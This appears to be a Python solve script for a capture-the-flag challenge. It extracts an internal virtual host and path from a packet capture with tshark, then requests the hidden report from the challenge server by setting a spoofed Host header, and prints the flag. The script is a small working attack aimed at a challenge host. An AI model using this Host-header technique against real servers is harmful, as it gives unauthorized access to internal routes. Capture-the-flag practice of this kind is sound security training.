#!/usr/bin/env python3
"""Recover NoNo's internal route from the PCAP and request the report."""

from __future__ import annotations

import argparse
import http.client
import re
import subprocess
import sys
from pathlib import Path


PUBLIC_HOST = "chal.thjcc.org:50000"
FLAG_RE = re.compile(rb"THJCC\{[^}]+\}")


def recover_internal_route(pcap: Path) -> tuple[str, str]:
    command = [
        "tshark",
        "-r",
        str(pcap),
        "-Y",
        "http.request",
        "-T",
        "fields",
        "-e",
        "http.host",
        "-e",
        "http.request.uri",
    ]
    output = subprocess.check_output(
        command,
        text=True,
        stderr=subprocess.DEVNULL,
    )

    for line in output.splitlines():
        fields = line.split("\t", 1)
        if len(fields) != 2:
            continue
        host, path = fields
        if host and host != PUBLIC_HOST:
            return host, path.rstrip("/") + "/"

    raise ValueError("no internal virtual-host request was found in the capture")


def fetch_report(target: str, port: int, virtual_host: str, path: str) -> bytes:
    connection = http.client.HTTPConnection(target, port, timeout=10)
    try:
        connection.request("GET", path, headers={"Host": virtual_host})
        response = connection.getresponse()
        body = response.read()
    finally:
        connection.close()

    if response.status != 200:
        raise RuntimeError(f"report request returned HTTP {response.status}")
    return body


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--pcap",
        type=Path,
        default=Path(__file__).parent / "artifacts" / "capture.pcap",
    )
    parser.add_argument("--target", default="chal.thjcc.org")
    parser.add_argument("--port", type=int, default=50000)
    args = parser.parse_args()

    virtual_host, path = recover_internal_route(args.pcap)
    print(f"recovered route: Host={virtual_host} path={path}")

    body = fetch_report(args.target, args.port, virtual_host, path)
    match = FLAG_RE.search(body)
    if not match:
        raise ValueError("the internal report did not contain a flag")
    print(match.group().decode())
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, ValueError, subprocess.SubprocessError) as error:
        print(f"error: {error}", file=sys.stderr)
        raise SystemExit(1)
